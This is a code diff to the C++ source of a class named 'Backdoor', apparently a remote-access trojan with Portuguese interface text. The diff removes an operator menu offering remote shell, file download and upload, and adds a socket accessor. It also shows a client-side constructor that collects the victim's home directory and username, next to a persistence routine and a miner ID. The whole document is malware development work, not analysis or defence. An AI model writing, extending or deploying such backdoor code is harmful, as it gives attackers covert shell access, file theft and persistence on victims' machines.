@@ -103,57 +103,9 @@ void Backdoor::download(const char *path){
 }
 
 
-void Backdoor::menu(){
-    if(this->is_server){
-        while(true){
-            int choice;
-            execute_command("cls");
-            std::cout << "MINER_ID = " << this->miner_id << " - IP = \n" << this->client_ip << std::endl;
-
-            std::cout << "Operações : " << std::endl;
-
-            std::cout << "1) Shell\n2) Download\n3)Upload\n" << std::endl;
-
-            choice = std::cin.get();
-
-
-            if(choice == 1){
-                this->c->send_message(this->sock, "1");
-                this->shell();
-            
-            }else if(choice == 2){
-                std::string path;
-                std::cout << "Path: ";
-                std::getline(std::cin, path);
-                // Get path
-                this->c->send_message(this->sock, "2");
-                this->download(path.c_str());
-
-            }else if(choice == 3){
-                std::string path;
-                std::cout << "Path: ";
-                std::getline(std::cin, path);
-                FILE *f = fopen(path.c_str(), "rb");
-                if(f != NULL){
-                    this->c->send_message(this->sock, "3");
-                    this->upload(path.c_str());
-                    fclose(f);
-                }else{
-                    Error::log_error("Arquivo inexistente na sua maquina.");
-                }
-
-            }else if(choice == 4){
-                return;
-            
-            }else{
-                Error::log_error("Comando inválido");
-            }
-        }
-    }else{
-        
-    }
+int Backdoor::get_sock(){
+    return this->sock;
 }
-
 
 
 void Backdoor::persistence(){
@@ -291,10 +243,7 @@ Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
     program_name = (char*)malloc(10);
     strcpy(this->program_name, "backdoor");
 
-    if(is_server){
-        //menu();
-        
-    }else{
+    if(!is_server){
         // GET ENVIROMENT VARIABLES
         get_home_enviroment();
         get_username();
